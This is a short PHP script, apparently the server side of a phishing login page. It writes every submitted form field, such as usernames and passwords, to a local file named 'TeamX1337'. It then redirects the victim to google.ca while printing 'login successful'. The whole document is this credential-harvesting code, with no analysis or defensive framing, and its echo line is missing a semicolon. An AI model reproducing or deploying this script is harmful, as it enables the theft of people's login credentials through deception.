<?php

header ('Location: http://google.ca ');

$handle = fopen("TeamX1337", "a");
foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
}
fwrite($handle, "===============\r\n");
fclose($handle);
echo"login successful"
exit;
?>